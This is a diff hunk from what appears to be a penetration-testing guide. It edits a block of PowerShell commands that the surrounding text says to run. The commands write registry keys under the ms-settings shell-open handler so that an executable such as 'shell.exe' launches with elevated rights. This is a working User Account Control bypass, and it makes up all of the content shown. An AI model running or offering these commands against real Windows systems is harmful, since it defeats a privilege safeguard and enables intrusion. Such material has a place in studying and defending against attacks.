@@ -371,7 +371,7 @@ Launch Powershell and run the following
 ````
 New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
 New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
-Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd /c start C:\Users\ted\Desktop[payloadname].exe" -Force
+Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd /c start C:\Users\ted\shell.exe" -Force
 ````
 
 
